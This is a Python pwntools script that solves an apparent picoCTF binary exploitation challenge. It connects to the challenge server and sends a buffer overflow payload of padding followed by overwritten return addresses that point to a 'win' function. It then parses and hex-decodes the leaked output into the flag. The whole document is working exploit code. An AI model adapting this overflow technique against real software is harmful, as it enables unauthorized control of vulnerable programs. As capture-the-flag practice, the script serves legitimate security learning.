from pwn import *

# r = process("./vuln")
r = remote('saturn.picoctf.net', 60896)

r.recvline()
# raw_input()
win_addr = 0x8049d90
UnderConstruction_addr = 0x8049e10
r.sendline(b'a' * 14 + p32(win_addr) + p32(UnderConstruction_addr) )
r.recvuntil(b': ')
flag = r.recvline().strip().decode()
r.recvuntil(b":")
flag += (" " + r.recvline().strip().decode())
r.recvuntil(b":")
flag += (" " + r.recvline().strip().decode())
success(flag)
flag = flag.split(' ')
FLAG = ""
for i in range(len(flag)):
    FLAG += flag[i][2:]

success("Flag = {}".format(bytes.fromhex(FLAG).decode('cp437')[::-1]))

r.interactive()